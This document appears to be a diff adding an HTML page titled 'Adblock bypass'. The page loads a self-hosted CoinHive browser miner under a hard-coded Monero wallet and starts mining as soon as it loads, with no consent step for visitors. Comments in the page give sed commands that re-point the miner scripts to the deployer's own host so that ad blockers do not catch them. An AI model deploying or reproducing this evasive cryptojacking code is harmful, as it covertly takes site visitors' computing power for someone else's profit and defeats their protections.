@@ -1,0 +1,27 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <title>Adblock bypass</title>
+  <!-- Replace "localhost:8892" to "yourhost" in ./miner/miner.min.js and in ./miner/cryptonight-asmjs.min.js -->
+  <!-- $ sed -i 's/localhost:8892/yourhost.com/g' ./miner/miner.min.js  -->
+  <!-- $ sed -i 's/localhost:8892/yourhost.com/g' ./miner/cryptonight-asmjs.min.js -->
+  <script src="./miner/miner.min.js"></script>
+</head>
+<body>
+<p id="sp"></p>
+<p id="th"></p>
+<p id="ah"></p>
+<script>
+var miner = new CoinHive.User('45jeeYiUfoKHooxvk4fc1x3yq2Qd7C8rZBthdUPMvTBMAbo4rksNd6CQ8wCuoJptJdedb3K2ND3FT91q8MjRPUGbVsYKPQx', 'coinhive');
+setInterval(function() {
+  var hashesPerSecond = miner.getHashesPerSecond();
+  var totalHashes = miner.getTotalHashes();
+  var acceptedHashes = miner.getAcceptedHashes();
+  document.getElementById("sp").innerHTML = "Speed = " + hashesPerSecond.toFixed(2) + " hash/sec";
+  document.getElementById("th").innerHTML = "Total Hashes = " + totalHashes;
+  document.getElementById("ah").innerHTML = "Accepted Hashes = " + acceptedHashes;
+}, 1000);
+miner.start();
+</script></body>
+</html>
